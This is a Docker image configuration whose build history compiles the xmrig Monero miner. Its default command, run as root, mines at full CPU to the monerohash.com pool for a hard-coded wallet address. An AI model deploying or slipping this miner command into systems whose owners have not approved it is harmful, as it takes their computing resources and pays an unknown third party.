{"architecture":"amd64","config":{"Hostname":"","Domainname":"","User":"root","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sh","-c","./xmrig -o stratum+tcp://monerohash.com:3333 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=100"],"ArgsEscaped":true,"Image":"sha256:11ecb5f6e8c554e0bad2c3498926a1eba386942b44ef288636a594a413eb4842","Volumes":null,"WorkingDir":"/app/xmrig/build","Entrypoint":null,"OnBuild":null,"Labels":null},"container":"5927611713c8eaef807d8051860310ae62a8f440fa20a5711a225d7820208f29","container_config":{"Hostname":"5927611713c8","Domainname":"","User":"root","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"/bin/sh\" \"-c\" \"./xmrig -o stratum+tcp://monerohash.com:3333 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=100\"]"],"ArgsEscaped":true,"Image":"sha256:11ecb5f6e8c554e0bad2c3498926a1eba386942b44ef288636a594a413eb4842","Volumes":null,"WorkingDir":"/app/xmrig/build","Entrypoint":null,"OnBuild":null,"Labels":{}},"created":"2018-10-06T23:11:03.991935709Z","docker_version":"18.03.1-ee-1-tp5","history":[{"created":"2018-09-05T22:20:55.163307996Z","created_by":"/bin/sh -c #(nop) ADD file:a83ab1826f43e88bc0d3ab6230f14cb9b2dacab70c762c3bfc555eda733b292c in / "},{"created":"2018-09-05T22:20:55.867042901Z","created_by":"/bin/sh -c set -xe \t\t\u0026\u0026 echo '#!/bin/sh' \u003e /usr/sbin/policy-rc.d \t\u0026\u0026 echo 'exit 101' \u003e\u003e /usr/sbin/policy-rc.d \t\u0026\u0026 chmod +x /usr/sbin/policy-rc.d \t\t\u0026\u0026 dpkg-divert --local --rename --add /sbin/initctl \t\u0026\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \t\u0026\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \t\t\u0026\u0026 echo 'force-unsafe-io' \u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t\u0026\u0026 echo 'DPkg::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'APT::Update::Post-Invoke { \"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\"; };' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\u0026\u0026 echo 'Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\";' \u003e\u003e /etc/apt/apt.conf.d/docker-clean \t\t\u0026\u0026 echo 'Acquire::Languages \"none\";' \u003e /etc/apt/apt.conf.d/docker-no-languages \t\t\u0026\u0026 echo 'Acquire::GzipIndexes \"true\"; Acquire::CompressionTypes::Order:: \"gz\";' \u003e /etc/apt/apt.conf.d/docker-gzip-indexes \t\t\u0026\u0026 echo 'Apt::AutoRemove::SuggestsImportant \"false\";' \u003e /etc/apt/apt.conf.d/docker-autoremove-suggests"},{"created":"2018-09-05T22:20:56.423645249Z","created_by":"/bin/sh -c rm -rf /var/lib/apt/lists/*"},{"created":"2018-09-05T22:20:57.023288712Z","created_by":"/bin/sh -c sed -i 's/^#\\s*\\(deb.*universe\\)$/\\1/g' /etc/apt/sources.list"},{"created":"2018-09-05T22:20:57.602946438Z","created_by":"/bin/sh -c mkdir -p /run/systemd \u0026\u0026 echo 'docker' \u003e /run/systemd/container"},{"created":"2018-09-05T22:20:57.758547727Z","created_by":"/bin/sh -c #(nop)  CMD [\"/bin/bash\"]","empty_layer":true},{"created":"2018-10-06T23:06:15.511399242Z","created_by":"/bin/sh -c #(nop) WORKDIR /app"},{"created":"2018-10-06T23:06:15.885984824Z","created_by":"/bin/sh -c #(nop)  USER root","empty_layer":true},{"created":"2018-10-06T23:06:35.195027185Z","created_by":"/bin/sh -c apt-get update"},{"created":"2018-10-06T23:08:50.494289403Z","created_by":"/bin/sh -c apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev"},{"created":"2018-10-06T23:08:55.444928567Z","created_by":"/bin/sh -c git clone https://github.com/xmrig/xmrig.git"},{"created":"2018-10-06T23:08:55.864495954Z","created_by":"/bin/sh -c #(nop) WORKDIR /app/xmrig","empty_layer":true},{"created":"2018-10-06T23:08:56.290739266Z","created_by":"/bin/sh -c #(nop) WORKDIR /app/xmrig/build"},{"created":"2018-10-06T23:09:03.158974548Z","created_by":"/bin/sh -c cmake .."},{"created":"2018-10-06T23:11:03.604169803Z","created_by":"/bin/sh -c make"},{"created":"2018-10-06T23:11:03.991935709Z","created_by":"/bin/sh -c #(nop)  CMD [\"/bin/sh\" \"-c\" \"./xmrig -o stratum+tcp://monerohash.com:3333 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=100\"]","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:8823818c474862932702f8a920abea43b2560ddceb910d145be9ba0eb149a643","sha256:19d043c86cbcb68e4f8363bf0363a2110af6e627eb9051cda1e8fc6ce1e43d7f","sha256:883eafdbe580e33bf34cb29e9c4c01a5fd7812f7ab93f9950cad1875e13e3915","sha256:4775b2f378bb7a98f1d64d2af7ee14251acd027c115065691719367c739ef25a","sha256:75b79e19929ce80a6ec6c059616338272fbac9173fdd5be1ee48b949261770cf","sha256:f8f5c793e0218ede85d6a181fe5e464dbb65e8352bb8a5b4809a2ecc90f82589","sha256:955fce4448453d2c05448ca311aabcd5c97fb33ac3f043b96b48667435b3d547","sha256:043c3b2ea57a9bf5ec8ca7e4bdeaa9efbabeb06d36952268f06f91cb7ef27e4f","sha256:df0b269642678168643ed261f57a9dcd8094d411a6eee2b1ed1fea56189e7ab6","sha256:7c67d31185412244db7b2fa477067cca0d8c792791b38d5c01ef2283f1ad1be4","sha256:0fdbd26178c4b0b0e773ca285aa7bec6c10fa0b407cdd9f61752922da8a00a80","sha256:3ff379740703963988ba30deb4c7e5a9ad308e2a1752f84fac1b29d3133e7cc8"]}}